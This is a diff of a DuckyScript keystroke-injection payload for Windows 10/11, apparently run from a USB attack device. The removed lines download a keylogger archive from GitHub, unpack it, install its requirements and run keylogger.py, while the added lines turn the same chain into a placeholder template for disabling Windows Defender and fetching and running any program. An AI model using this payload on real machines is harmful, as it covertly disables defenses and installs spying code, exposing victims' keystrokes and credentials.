@@ -1,4 +1,4 @@
-REM Title: Désactiver Windows Defender et Ouvrir un Keylogger
+REM Title: Disable windows defender and run a python program
 REM Author: s0_deep(v1.0)
 REM Target: Windows 10/11 (Powershell)
 
@@ -55,10 +55,10 @@ ENTER
 DELAY 1000
 STRING cd C:\Users\Public\Documents
 ENTER
-STRING $zipUrl = 'https://github.com/waaashed/EthicalKeylogger/archive/main.zip'
+STRING $zipUrl = 'LINK TO YOUR GITHUB REPOSITORY'
 ENTER
 DELAY 500
-STRING $zipFileName = 'EthicalKeylogger-main.zip'
+STRING $zipFileName = 'YOUR FILE NAME.zip'
 ENTER
 DELAY 500
 STRING $destinationDirectory = '.'
@@ -70,16 +70,16 @@ DELAY 500
 STRING Expand-Archive -Path $zipFileName -DestinationPath $destinationDirectory
 ENTER
 DELAY 500
-STRING Rename-Item -Path (Join-Path $destinationDirectory "EthicalKeylogger-main") -NewName "EthicalKeylogger"
+STRING Rename-Item -Path (Join-Path $destinationDirectory "YOUR FILE NAME") -NewName "YOUR FILE NEW NAME"
 ENTER
 STRING Remove-Item -Path $zipFileName
 ENTER
-STRING cd .\EthicalKeylogger\Keylogger_s0d3ep
+STRING cd .\YOUR FILE NAME\..
 ENTER
 STRING pip install -r requirements.txt
 ENTER
 DELAY 5000
-STRING python keylogger.py
+STRING python YOUR PROGRAM NAME.py
 ENTER
 DELAY 100
 WINDOWS d
